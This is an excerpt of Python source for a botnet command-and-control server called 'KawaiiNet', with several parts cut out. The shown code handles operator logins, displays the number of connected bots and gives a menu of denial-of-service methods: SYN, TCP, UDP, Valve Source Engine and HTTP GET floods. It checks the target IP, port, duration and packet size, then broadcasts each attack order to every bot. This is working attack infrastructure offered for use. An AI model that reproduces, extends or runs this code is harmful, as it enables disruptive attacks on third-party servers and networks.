...
def validate_time(time):
    ...
    return time.isdigit() and int(time) >= 5 and int(time) <= 7300

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 65507
...
def update_title(client, username):
    ...
    while 1:
        try:
            send(client, f'\33]0;UwU:Kawaii Net | Bots: {len(bots)} | Account Name: {username} \a', False)
            time.sleep(2)
        except:
            client.close()
...
def command_line(client):
    ...
    prompt = f'{Fore.MAGENTA}BetaV1.2-|KawaiiNet|{Fore.MAGENTA}~${Fore.MAGENTA}'
    ...
    while 1:
        try:
            ...
            if command == 'HELP':
                send(client, Fore.RED + '    _COMMANDS_        ')
                send(client, Fore.GREEN + '    | HELP   | ')
                send(client, Fore.BLUE + '    | METHODS|')
                send(client, Fore.MAGENTA + '    | CLEAR  | ')
                send(client, Fore.YELLOW + '    | LOGOUT |')
                send(client, '')

            elif command == 'METHODS':
                send(client, Fore.YELLOW +  ' METHODS START')
                send(client, Fore.RED + ' MAX TIME = 7300  MAX SIZE = 65507')
                send(client, '')
                send(client, Fore.GREEN + '!syn: TCP SYN flood')
                send(client, Fore.RED + '!tcp: TCP junk flood')
                send(client, Fore.MAGENTA + '!udp: UDP junk flood')
                send(client, Fore.BLUE + '!vse: UDP Valve Source Engine specific flood')
                send(client, Fore.YELLOW + '!http: HTTP GET request flood ')
                send(client, '')
                send(client, Fore.BLUE + ' MAX TIME = 7300  MAX SIZE = 65507')
                send(client,Fore.GREEN + ' METHODS END')
                ...
                send(client, 'Loging out, See You Soon UwU')
                time.sleep(1)
                break
                    ...
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'UwU Attack sent accross {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (5-7300 seconds)')
                        else:
                        ...
                        if validate_port(port):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'ヽUwU Attack sent accross {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65507 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (5-7300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
            ...
            # HTTP GET request flood
                ...
                send(client, Fore.RED + 'UwU: Unknown Command')
...
def handle_client(client, address):
    send(client, f'\33]0;UWU | Login\a', False)

    # username login
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}:{Fore.GREEN} ', False, False)
    ...
    if password != '\xff\xff\xff\xff\75':
        ...
        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid Login （♯▼皿▼）')
            time.sleep(1)
            client.close()
            return
